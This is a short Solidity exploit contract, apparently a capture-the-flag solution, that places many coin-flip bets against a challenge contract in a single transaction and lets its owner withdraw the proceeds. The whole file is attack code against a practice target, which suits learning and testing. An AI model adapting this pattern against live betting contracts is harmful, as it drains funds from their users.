pragma solidity ^0.8.13;

import "./Chal.sol";

contract Pwner {
	address public immutable OWNER;
	Chal public immutable TARGET;

	constructor(address payable chal) payable {
		 OWNER = msg.sender;
		 TARGET = Chal(chal);
	}

	receive() external payable {}

	function doPwn(uint256 num) external payable {
		uint256 x = msg.value;
		require(x > 0, "msg.value must be > 0");

		uint256 individualBet = x / num;

		for (uint256 i = 0; i < num; ++i) {
			TARGET.playCoinFlip{value: individualBet}();
		}
	}

	function retrieve() external {
		 require(msg.sender == OWNER, "Not owner");
		 payable(OWNER).transfer(address(this).balance);
	}
}

